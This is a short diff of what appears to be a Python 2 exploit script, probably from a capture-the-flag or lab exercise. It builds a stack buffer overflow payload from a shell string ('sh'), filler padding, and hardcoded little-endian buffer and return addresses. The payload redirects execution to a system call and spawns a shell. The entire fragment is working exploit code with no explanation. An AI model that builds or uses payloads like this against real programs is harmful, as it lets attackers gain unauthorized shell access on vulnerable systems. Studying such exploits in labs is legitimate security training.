@@ -5,4 +5,4 @@ bufAddr = 0xbffea0d6
 sysCallAddr = 0x08048eed
 retadd = sysCallAddr
 
-print "/bin/sh" + " " + "#" * (26-4-4-7-1) + pack("<I", bufAddr) + pack("<I", retadd)
+print "sh" + "\"" * (30-4-4-2) + pack("<I", retadd) + pack("<I", bufAddr)
